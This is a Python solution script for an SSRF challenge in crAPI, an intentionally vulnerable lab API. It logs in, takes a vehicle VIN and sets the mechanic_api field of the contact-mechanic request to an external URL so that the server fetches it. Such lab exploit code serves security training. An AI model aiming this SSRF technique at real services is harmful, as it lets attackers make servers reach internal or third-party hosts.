#!/usr/bin/env python3
"""
Challenge 11: SSRF (make crAPI call https://www.google.com)

Flow:
  1. Login
  2. Get vehicle info
  3. Send contact mechanic with mechanic_api pointing to external URL
"""

import argparse
import sys
from pathlib import Path
from typing import Optional, List, Dict, Any

import requests
import yaml


def load_config(path: str) -> dict:
    with open(path, "r") as f:
        return yaml.safe_load(f)


def login(base_url: str, email: str, password: str, timeout: float = 15) -> Optional[str]:
    url = f"{base_url.rstrip('/')}/identity/api/auth/login"
    payload = {"email": email, "password": password}
    try:
        r = requests.post(url, json=payload, timeout=timeout)
        r.raise_for_status()
        data = r.json()
        return data.get("token") or data.get("access_token")
    except requests.RequestException as e:
        print(f"[!] Login failed: {e}")
        return None


def get_vehicles(base_url: str, token: str, timeout: float = 15) -> List[Dict[str, Any]]:
    """Get user's vehicles"""
    url = f"{base_url.rstrip('/')}/identity/api/v2/vehicle/vehicles"
    headers = {"Authorization": f"Bearer {token}"}
    try:
        r = requests.get(url, headers=headers, timeout=timeout)
        r.raise_for_status()
        data = r.json()
        if isinstance(data, list):
            return data
        return data.get("vehicles") or []
    except requests.RequestException as e:
        print(f"[!] get_vehicles failed: {e}")
        return []


def contact_mechanic_ssrf(base_url: str, token: str, vin: str, target_url: str, timeout: float = 15) -> Optional[Dict[str, Any]]:
    """Contact mechanic with SSRF payload"""
    url = f"{base_url.rstrip('/')}/workshop/api/merchant/contact_mechanic"
    headers = {"Authorization": f"Bearer {token}"}
    payload = {
        "mechanic_api": target_url,
        "mechanic_code": "TRAC_JHN",
        "number_of_repeats": 1,
        "problem_details": "SSRF test",
        "repeat_request_if_failed": False,
        "vin": vin
    }
    try:
        r = requests.post(url, json=payload, headers=headers, timeout=timeout)
        r.raise_for_status()
        return r.json()
    except requests.RequestException as e:
        print(f"[!] contact_mechanic failed: {e}")
        return None


def main():
    parser = argparse.ArgumentParser(description="Challenge 11: SSRF")
    parser.add_argument("--config", default="../crapi_config.yaml", help="Config file")
    parser.add_argument("--user-email", default="mike1@my.lab", help="User email")
    parser.add_argument("--target-url", default="https://www.google.com", help="Target URL for SSRF")
    args = parser.parse_args()

    config_path = Path(args.config)
    if not config_path.exists():
        print(f"Config not found: {config_path}", file=sys.stderr)
        sys.exit(1)

    cfg = load_config(config_path)
    base_url = cfg["target"]["base_url"]
    password = cfg["known_users"]["password"]

    print(f"[*] Challenge 11: SSRF (Server-Side Request Forgery)")
    print(f"[*] Target: {base_url}")
    print("-" * 60)

    print(f"\n[1] Logging in...")
    token = login(base_url, args.user_email, password)
    if not token:
        print("[!] Login failed")
        sys.exit(1)
    print("[+] Logged in")

    print(f"\n[2] Getting vehicles...")
    vehicles = get_vehicles(base_url, token)
    if not vehicles:
        print("[!] No vehicles found")
        sys.exit(1)

    vin = vehicles[0].get("vin")
    print(f"[+] Using VIN: {vin}")

    print(f"\n[3] SSRF ATTACK: Sending contact mechanic with external URL...")
    print(f"[!] Target URL: {args.target_url}")

    response = contact_mechanic_ssrf(base_url, token, vin, args.target_url)

    if response:
        rfm = response.get("response_from_mechanic_api") or {}
        if rfm:
            print(f"[+] SUCCESS! Received response from {args.target_url}")
            print(f"[+] Response snippet: {str(rfm)[:200]}...")
            print(f"\n[!] VULNERABLE: SSRF possible via mechanic_api parameter")
        else:
            print(f"[!] No response from mechanic_api")
    else:
        print("[!] Request failed")


if __name__ == "__main__":
    main()
